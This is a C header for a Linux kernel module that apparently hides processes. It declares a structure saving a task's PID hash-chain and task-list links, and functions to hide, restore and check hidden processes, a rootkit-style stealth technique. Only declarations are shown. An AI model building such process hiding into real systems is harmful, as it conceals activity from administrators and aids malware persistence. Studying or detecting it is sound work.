#ifndef HIDE_PID_H_
#define HIDE_PID_H_

#include <linux/types.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/pid.h>

struct pid_node
{
    pid_t pid_number;
    struct task_struct *task;
    struct list_head list;
    struct hlist_node *saved_pid_chain;
    struct list_head *saved_tasks_prev;
    struct list_head *saved_tasks_next;
};

int hide_process(pid_t pid_number);
int restore_process(pid_t pid_number);
void hide_cleanup(void);
bool is_process_hidden(pid_t pid_number);

#endif // HIDE_PID_H_